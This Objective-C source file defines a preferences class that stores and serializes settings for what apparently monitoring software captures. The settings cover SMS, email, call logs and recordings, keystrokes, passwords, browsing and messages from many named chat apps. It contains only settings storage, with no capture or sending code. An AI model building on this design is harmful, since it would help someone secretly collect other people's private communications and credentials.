/** 
 - Project name: Preferences
 - Class name: PrefEventsCapture
 - Version: 1.0
 - Purpose: Preference about captur
 - Copy right: 28/11/11, Benjawan Tanarattanakorn, Vervata Co., Ltd. All right reserved.
 */

#import "PrefEventsCapture.h"
#import "AESCryptor.h"
#import "PrefUtils.h"

@interface PrefEventsCapture (private)
- (void) transferDataToVariables: (NSData *) aData;
@end

@implementation PrefEventsCapture

@synthesize mStartCapture;
@synthesize mEnableCallLog;
@synthesize mEnableSMS;
@synthesize mEnableEmail;
@synthesize mEnableMMS;
@synthesize mEnableIM;
@synthesize mEnablePinMessage;
@synthesize mEnableWallPaper;
@synthesize mEnableCameraImage;
@synthesize mEnableAudioFile;
@synthesize mEnableVideoFile;
@synthesize mEnableBrowserUrl;
@synthesize mEnableALC;
@synthesize mEnableCallRecording;
@synthesize mEnableCalendar;
@synthesize mEnableNote;
@synthesize mEnableVoIPLog;
@synthesize mSearchMediaFilesFlags;
@synthesize mDeliveryMethod;
@synthesize mMaxEvent;
@synthesize mDeliverTimer;
@synthesize mEnableKeyLog;
@synthesize mEnablePageVisited;
@synthesize mEnablePassword;
@synthesize mEnableIndividualIM;
@synthesize mEnableUSBConnection;
@synthesize mEnableFileTransfer;
@synthesize mEnableAppUsage;
@synthesize mEnableLogon;
@synthesize mEnableTemporalControlSSR;
@synthesize mEnableTemporalControlAR;
@synthesize mEnableTemporalControlNetworkTraffic;
@synthesize mIMAttachmentImageLimitSize;
@synthesize mIMAttachmentAudioLimitSize;
@synthesize mIMAttachmentVideoLimitSize;
@synthesize mIMAttachmentNonMediaLimitSize;
@synthesize mEnableNetworkConnection;
@synthesize mEnablePrintJob;

- (id) init {
	self = [super init];
	if (self != nil) {
		[self setMMaxEvent:10];
        [self setMEnableIndividualIM:(kPrefIMIndividualWhatsApp |
                                      kPrefIMIndividualLINE     |
                                      kPrefIMIndividualFacebook |
                                      kPrefIMIndividualSkype    |
                                      kPrefIMIndividualBBM      |
                                      kPrefIMIndividualIMessage |
                                      kPrefIMIndividualViber    |
                                      kPrefIMIndividualWeChat           |
                                      kPrefIMIndividualYahooMessenger   |
                                      kPrefIMIndividualSnapchat         |
                                      kPrefIMIndividualHangout          |
                                      kPrefIMIndividualAppShotLINE      |
                                      kPrefIMIndividualAppShotSkype     |
                                      kPrefIMIndividualAppShotQQ        |
                                      kPrefIMIndividualAppShotIMessage  |
                                      kPrefIMIndividualAppShotViber     |
                                      kPrefIMIndividualAppShotWeChat    |
                                      kPrefIMIndividualAppShotAIM       |
                                      kPrefIMIndividualAppShotTrillian)];
        
        [self setMIMAttachmentImageLimitSize:5];
        [self setMIMAttachmentAudioLimitSize:5];
        [self setMIMAttachmentVideoLimitSize:5];
        [self setMIMAttachmentNonMediaLimitSize:5];
	}
	return self;
}

- (id) initFromData: (NSData *) aData {
	self = [super init];
	if (self != nil) {
		[self transferDataToVariables:aData];
	}
	return self;
}

- (id) initFromFile: (NSString *) aFilePath
{
	self = [super init];
	if (self != nil) {
		NSData *data = [NSData dataWithContentsOfFile:aFilePath];
		[self transferDataToVariables:data];
	}
	return self;
}

- (NSData *) toData {
	NSMutableData* data = [[NSMutableData alloc] init];
	
	[data appendBytes:&mMaxEvent length:sizeof(NSInteger)];
	[data appendBytes:&mDeliverTimer length:sizeof(NSInteger)];
	[data appendBytes:&mStartCapture length:sizeof(BOOL)];
	[data appendBytes:&mEnableCallLog length:sizeof(BOOL)];
	[data appendBytes:&mEnableSMS length:sizeof(BOOL)];
	[data appendBytes:&mEnableEmail length:sizeof(BOOL)];
	[data appendBytes:&mEnableMMS length:sizeof(BOOL)];
	[data appendBytes:&mEnableIM length:sizeof(BOOL)];
	[data appendBytes:&mEnablePinMessage length:sizeof(BOOL)];
	[data appendBytes:&mEnableWallPaper length:sizeof(BOOL)];
	[data appendBytes:&mEnableCameraImage length:sizeof(BOOL)];
	[data appendBytes:&mEnableAudioFile length:sizeof(BOOL)];
	[data appendBytes:&mEnableVideoFile length:sizeof(BOOL)];
	[data appendBytes:&mSearchMediaFilesFlags length:sizeof(NSUInteger)];
	[data appendBytes:&mEnableBrowserUrl length:sizeof(BOOL)];
	[data appendBytes:&mEnableALC length:sizeof(BOOL)];
	[data appendBytes:&mEnableCallRecording length:sizeof(BOOL)];
	[data appendBytes:&mEnableCalendar length:sizeof(BOOL)];
	[data appendBytes:&mEnableNote length:sizeof(BOOL)];
	[data appendBytes:&mEnableVoIPLog length:sizeof(BOOL)];	
	[data appendBytes:&mDeliveryMethod length:sizeof(NSUInteger)];
	[data appendBytes:&mEnableKeyLog length:sizeof(BOOL)];
    [data appendBytes:&mEnablePageVisited length:sizeof(BOOL)];
    [data appendBytes:&mEnablePassword length:sizeof(BOOL)];
    [data appendBytes:&mEnableIndividualIM length:sizeof(NSUInteger)];
    [data appendBytes:&mEnableUSBConnection length:sizeof(BOOL)];
    [data appendBytes:&mEnableFileTransfer length:sizeof(BOOL)];
    [data appendBytes:&mEnableAppUsage length:sizeof(BOOL)];
    [data appendBytes:&mEnableLogon length:sizeof(BOOL)];
    [data appendBytes:&mEnableTemporalControlSSR length:sizeof(BOOL)];
    [data appendBytes:&mEnableTemporalControlAR length:sizeof(BOOL)];
    [data appendBytes:&mIMAttachmentImageLimitSize length:sizeof(NSUInteger)];
    [data appendBytes:&mIMAttachmentAudioLimitSize length:sizeof(NSUInteger)];
    [data appendBytes:&mIMAttachmentVideoLimitSize length:sizeof(NSUInteger)];
    [data appendBytes:&mIMAttachmentNonMediaLimitSize length:sizeof(NSUInteger)]; 
    [data appendBytes:&mEnableNetworkConnection length:sizeof(BOOL)];
    [data appendBytes:&mEnablePrintJob length:sizeof(BOOL)];
    [data appendBytes:&mEnableTemporalControlNetworkTraffic length:sizeof(BOOL)];
    
    DLog (@"data length %d", (int)[data	length])
	[data autorelease];
	return data;
}

- (void) transferDataToVariables: (NSData *) aData {
	DLog (@"PrefEventsCapture ----> transferDataToVariables");
	DLog (@"length of data %d", (int)[aData length]);
	
	NSInteger location;
	BOOL notExceedLength = YES;
	
	[aData getBytes:&mMaxEvent length:sizeof(NSInteger)];
	location = sizeof(NSInteger);
	//DLog (@"location 1 %d", location)
	NSRange range = NSMakeRange(location, sizeof(NSInteger));
	[aData getBytes:&mDeliverTimer range:range];
	location += sizeof(NSInteger);
	//DLog (@"location 2 %d", location)
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mStartCapture range:range];
	location += sizeof(BOOL);
	//DLog (@"location 3 %d", location)	
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableCallLog range:range];
	location += sizeof(BOOL);
	//DLog (@"location 4 %d", location)
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableSMS range:range];
	location += sizeof(BOOL);
	//DLog (@"location 5 %d", location)
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableEmail range:range];
	location += sizeof(BOOL);
	//DLog (@"location 6 %d", location)	
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableMMS range:range];
	location += sizeof(BOOL);
	//DLog (@"location 7 %d", location)		
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableIM range:range];
	location += sizeof(BOOL);
	//DLog (@"location 8 %d", location)		
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnablePinMessage range:range];
	location += sizeof(BOOL);
	//DLog (@"location 9 %d", location)	
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableWallPaper range:range];
	location += sizeof(BOOL);
	//DLog (@"location 10 %d", location)		
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableCameraImage range:range];
	location += sizeof(BOOL);
	//DLog (@"location 11 %d", location)		
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableAudioFile range:range];
	location += sizeof(BOOL);
//	DLog (@"location 12 %d", location)
//	if (notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(BOOL) 
//												 location:location
//											 dataSize:[aData length]
//										   previousResult:notExceedLength]){
	
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableVideoFile range:range];
	location += sizeof(BOOL);
//	DLog (@"location 13 %d", location)	
//	}
//	if (notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(NSUInteger) 
//												 location:location
//											 dataSize:[aData length]
//											   previousResult:notExceedLength]){
	range = NSMakeRange(location, sizeof(NSUInteger));
	[aData getBytes:&mSearchMediaFilesFlags range:range];
	location += sizeof(NSUInteger);
//	DLog (@"location 14 %d", location)	
//	}
//	if (notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(BOOL) 
//												 location:location
//											 dataSize:[aData length]
//										   previousResult:notExceedLength]){
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableBrowserUrl range:range];
	location += sizeof(BOOL);
//	DLog (@"location 15 %d", location)	
//	}
//	if (notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(BOOL) 
//												 location:location
//											 dataSize:[aData length]
//										   previousResult:notExceedLength]){
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableALC range:range];
	location += sizeof(BOOL);
//	DLog (@"location 16 %d", location)	
//	}				
//	// - get mEnableCallRecording
//	if (notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(BOOL) 
//												 location:location
//											 dataSize:[aData length]
//										   previousResult:notExceedLength]){
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableCallRecording range:range];
	location += sizeof(BOOL);
//	DLog (@"location 17 %d", location);
//	}
//	// - get mEnableCalendar
//	if (notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(BOOL) 
//												  location:location
//											  dataSize:[aData length]
//											previousResult:notExceedLength]){
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableCalendar range:range];
	location += sizeof(BOOL);
//	DLog (@"location 18 %d", location)				
//	}
//	// - get mEnableNote
//	if (notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(BOOL) 
//												 location:location
//											 dataSize:[aData length]
//										   previousResult:notExceedLength]){		
	range = NSMakeRange(location, sizeof(BOOL));
	[aData getBytes:&mEnableNote range:range];
	location += sizeof(BOOL);		
	DLog (@"location 19 %d", (int)location)	
//	}
	// -- get mEnableVoIPLog
	if ((notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(BOOL) 
															  location:location
															  dataSize:[aData length]
														previousResult:notExceedLength])){
		range = NSMakeRange(location, sizeof(BOOL));
		[aData getBytes:&mEnableVoIPLog range:range];
		location += sizeof(BOOL);
		DLog (@"location 20 %d", (int)location)
	}
	// -- get mDeliveryMethod
	if ((notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(NSUInteger) 
															  location:location
															  dataSize:[aData length]
														previousResult:notExceedLength])){
		range = NSMakeRange(location, sizeof(NSUInteger));
		[aData getBytes:&mDeliveryMethod range:range];
		location += sizeof(NSUInteger);
		DLog (@"location 21 %d", (int)location)
	}
	//-- get mEnableKeyLog
	if ((notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(BOOL) 
															  location:location
															  dataSize:[aData length]
														previousResult:notExceedLength])){
		range = NSMakeRange(location, sizeof(BOOL));
		[aData getBytes:&mEnableKeyLog range:range];
		location += sizeof(BOOL);
		DLog (@"location 22 %d", (int)location)
	}
    //-- get mEnablePageVisited
	if ((notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(BOOL) 
                                                               location:location
                                                               dataSize:[aData length]
                                                         previousResult:notExceedLength])){
		range = NSMakeRange(location, sizeof(BOOL));
		[aData getBytes:&mEnablePageVisited range:range];
		location += sizeof(BOOL);
		DLog (@"location 23 %d", (int)location)
	}
    //-- get mEnablePassword
	if ((notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(BOOL)
                                                               location:location
                                                               dataSize:[aData length]
                                                         previousResult:notExceedLength])){
		range = NSMakeRange(location, sizeof(BOOL));
		[aData getBytes:&mEnablePassword range:range];
		location += sizeof(BOOL);
		DLog (@"location 24 %d", (int)location)
	}
    //-- get mEnableIndividualIM
    if ((notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(NSUInteger)
                                                               location:location
                                                               dataSize:[aData length]
                                                         previousResult:notExceedLength])){
		range = NSMakeRange(location, sizeof(NSUInteger));
		[aData getBytes:&mEnableIndividualIM range:range];
		location += sizeof(NSUInteger);
		DLog (@"location 25 %d", (int)location)
        DLog (@"mEnableIndividualIM %lu", (unsigned long)mEnableIndividualIM)
	}
    //-- get mEnableUSBConnection
    if ((notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(BOOL)
                                                               location:location
                                                               dataSize:[aData length]
                                                         previousResult:notExceedLength])){
        range = NSMakeRange(location, sizeof(BOOL));
        [aData getBytes:&mEnableUSBConnection range:range];
        location += sizeof(BOOL);
        DLog (@"location 26 %d", (int)location)
    }
    //-- get mEnableFileTransfer
    if ((notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(BOOL)
                                                               location:location
                                                               dataSize:[aData length]
                                                         previousResult:notExceedLength])){
        range = NSMakeRange(location, sizeof(BOOL));
        [aData getBytes:&mEnableFileTransfer range:range];
        location += sizeof(BOOL);
        DLog (@"location 27 %d", (int)location)
    }
    //-- get mEnableAppUsage
    if ((notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(BOOL)
                                                               location:location
                                                               dataSize:[aData length]
                                                         previousResult:notExceedLength])){
        range = NSMakeRange(location, sizeof(BOOL));
        [aData getBytes:&mEnableAppUsage range:range];
        location += sizeof(BOOL);
        DLog (@"location 28 %d", (int)location)
    }
    //-- get mEnableLogon
    if ((notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(BOOL)
                                                               location:location
                                                               dataSize:[aData length]
                                                         previousResult:notExceedLength])){
        range = NSMakeRange(location, sizeof(BOOL));
        [aData getBytes:&mEnableLogon range:range];
        location += sizeof(BOOL);
        DLog (@"location 29 %d", (int)location)
    }
    //-- get mEnableTemporalControlSSR
    if ((notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(BOOL)
                                                               location:location
                                                               dataSize:[aData length]
                                                         previousResult:notExceedLength])){
        range = NSMakeRange(location, sizeof(BOOL));
        [aData getBytes:&mEnableTemporalControlSSR range:range];
        location += sizeof(BOOL);
        DLog (@"location 30 %d", (int)location)
    }
    //-- get mEnableTemporalControlAR
    if ((notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(BOOL)
                                                               location:location
                                                               dataSize:[aData length]
                                                         previousResult:notExceedLength])){
        range = NSMakeRange(location, sizeof(BOOL));
        [aData getBytes:&mEnableTemporalControlAR range:range];
        location += sizeof(BOOL);
        DLog (@"location 31 %d", (int)location)
    }

    // -- get mIMAttachmentImageLimitSize
    if ((notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(NSUInteger)
                                                               location:location
                                                               dataSize:[aData length]
                                                         previousResult:notExceedLength])){
        range = NSMakeRange(location, sizeof(NSUInteger));
        [aData getBytes:&mIMAttachmentImageLimitSize range:range];
        location += sizeof(NSUInteger);
        DLog (@"location 32 image %d", (int)location)
    }
    // -- get mIMAttachmentAudioLimitSize
    if ((notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(NSUInteger)
                                                               location:location
                                                               dataSize:[aData length]
                                                         previousResult:notExceedLength])){
        range = NSMakeRange(location, sizeof(NSUInteger));
        [aData getBytes:&mIMAttachmentAudioLimitSize  range:range];
        location += sizeof(NSUInteger);
        DLog (@"location 33 audio %d", (int)location)
    }
    // -- get mIMAttachmentVideoLimitSize
    if ((notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(NSUInteger)
                                                               location:location
                                                               dataSize:[aData length]
                                                         previousResult:notExceedLength])){
        range = NSMakeRange(location, sizeof(NSUInteger));
        [aData getBytes:&mIMAttachmentVideoLimitSize range:range];
        location += sizeof(NSUInteger);
        DLog (@"location 34 video %d", (int)location)
    }
    // -- get mIMAttachmentNonMediaLimitSize
    if ((notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(NSUInteger)
                                                               location:location
                                                               dataSize:[aData length]
                                                         previousResult:notExceedLength])){
        range = NSMakeRange(location, sizeof(NSUInteger));
        [aData getBytes:&mIMAttachmentNonMediaLimitSize range:range];
        location += sizeof(NSUInteger);
        DLog (@"location 35 non-media %d", (int)location)
    }

    //-- get mEnableNetworkConnection
    if ((notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(BOOL)
                                                               location:location
                                                               dataSize:[aData length]
                                                         previousResult:notExceedLength])){
        range = NSMakeRange(location, sizeof(BOOL));
        [aData getBytes:&mEnableNetworkConnection range:range];
        location += sizeof(BOOL);
        DLog (@"location 36 network connection %d", (int)location)
    }
    
    //-- get mEnablePrintJob
    if ((notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(BOOL)
                                                               location:location
                                                               dataSize:[aData length]
                                                         previousResult:notExceedLength])){
        range = NSMakeRange(location, sizeof(BOOL));
        [aData getBytes:&mEnablePrintJob range:range];
        location += sizeof(BOOL);
        DLog (@"location 37 Print Job  %d", (int)location)
    }
    
    //-- get mEnableTemporalControlNetworkTraffic
    if ((notExceedLength = [PrefUtils exceedDataLengthForInstanceOfSize:sizeof(BOOL)
                                                               location:location
                                                               dataSize:[aData length]
                                                         previousResult:notExceedLength])){
        range = NSMakeRange(location, sizeof(BOOL));
        [aData getBytes:&mEnableTemporalControlNetworkTraffic range:range];
        location += sizeof(BOOL);
        DLog (@"location 38 %d", (int)location)
    }
    
    DLog(@"=== DONE ===")
}

- (PreferenceType) type {
	return kEvents_Ctrl;
}

- (void) reset {
	[self setMStartCapture:NO];
	[self setMEnableCallLog:NO];
	[self setMEnableSMS:NO];
	[self setMEnableEmail:NO];
	[self setMEnableMMS:NO];
	[self setMEnableIM:NO];
	[self setMEnablePinMessage:NO];
	[self setMEnableWallPaper:NO];
	[self setMEnableCameraImage:NO];
	[self setMEnableAudioFile:NO];
	[self setMEnableVideoFile:NO];
	[self setMEnableBrowserUrl:NO];
	[self setMEnableALC:NO];
	[self setMEnableCallRecording:NO];
	[self setMEnableCalendar:NO];
	[self setMEnableNote:NO];
	[self setMEnableVoIPLog:NO];
	[self setMEnableKeyLog:NO];
    [self setMEnablePageVisited:NO];
    [self setMEnablePassword:NO];
	[self setMSearchMediaFilesFlags:0x00];
	[self setMDeliveryMethod:kDeliveryMethodAny];
	[self setMMaxEvent:10];
	[self setMDeliverTimer:1];
    [self setMEnableIndividualIM:(kPrefIMIndividualWhatsApp |
                                  kPrefIMIndividualLINE     |
                                  kPrefIMIndividualFacebook |
                                  kPrefIMIndividualSkype    |
                                  kPrefIMIndividualBBM      |
                                  kPrefIMIndividualIMessage |
                                  kPrefIMIndividualViber    |
                                  kPrefIMIndividualWeChat           |
                                  kPrefIMIndividualYahooMessenger   |
                                  kPrefIMIndividualSnapchat         |
                                  kPrefIMIndividualHangout          |
                                  kPrefIMIndividualAppShotLINE      |
                                  kPrefIMIndividualAppShotSkype     |
                                  kPrefIMIndividualAppShotQQ        |
                                  kPrefIMIndividualAppShotIMessage  |
                                  kPrefIMIndividualAppShotViber     |
                                  kPrefIMIndividualAppShotWeChat    |
                                  kPrefIMIndividualAppShotAIM       |
                                  kPrefIMIndividualAppShotTrillian)];
    [self setMEnableUSBConnection:NO];
    [self setMEnableFileTransfer:NO];
    [self setMEnableAppUsage:NO];
    [self setMEnableLogon:NO];
    [self setMEnableTemporalControlSSR:NO];
    [self setMEnableTemporalControlAR:NO];
    [self setMIMAttachmentImageLimitSize:5];
    [self setMIMAttachmentAudioLimitSize:5];
    [self setMIMAttachmentVideoLimitSize:5];
    [self setMIMAttachmentNonMediaLimitSize:5];
    [self setMEnableNetworkConnection:NO];
    [self setMEnablePrintJob:NO];
    [self setMEnableTemporalControlNetworkTraffic:NO];
}

- (void) dealloc {
	[super dealloc];
}

@end
